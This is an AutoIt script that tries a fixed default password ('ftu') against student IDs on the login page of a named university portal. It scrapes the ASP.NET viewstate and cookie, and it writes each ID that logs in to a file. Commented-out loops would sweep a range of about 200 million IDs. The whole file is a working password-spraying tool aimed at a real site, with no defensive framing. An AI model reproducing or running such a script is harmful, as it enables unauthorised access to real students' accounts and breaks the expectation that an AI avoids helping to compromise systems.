#include <_HttpRequest.au3>
#include <AutoItConstants.au3>
#include <pause.au3>

$source_login = _HttpRequest(4, 'http://ftugate.ftu.edu.vn/default.aspx?page=dangnhap')
$cookie = _GetCookie($source_login[0])
$pass = 'ftu'
$in__VIEWSTATE = StringRegExp($source_login[1], 'name="__VIEWSTATE" id="__VIEWSTATE" value="(.*?)"', 1)
; Display a progress bar window.
;ProgressOn("Progress Meter", "Increments every second", "0%", -1, -1, BitOR($DLG_NOTONTOP, $DLG_MOVEABLE))
;For $i = 1611110000 To 1811110000
;	$msv = $i
;for $i = 1611110302 to 1611110304
	$msv=1611110303
	$data_login = _Data2SendEncode('__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=' & $in__VIEWSTATE[0] & '&ctl00$ContentPlaceHolder1$ctl00$txtTaiKhoa=' & $msv & '&ctl00$ContentPlaceHolder1$ctl00$txtMatKhau=' & $pass & '&ctl00$ContentPlaceHolder1$ctl00$btnDangNhap=Đăng Nhập')
	$login = _HttpRequest(4, 'http://ftugate.ftu.edu.vn/default.aspx?page=dangnhap', $data_login, $cookie, '', 'DNT: 1|Upgrade-Insecure-Requests: 1')
	If  (StringInStr($login[1], "ctl00_Header1_ucLogout_lblNguoiDung") > 0) Then
		FileWriteLine(@ScriptDir&'\acc.txt',$msv)
	EndIf
;Next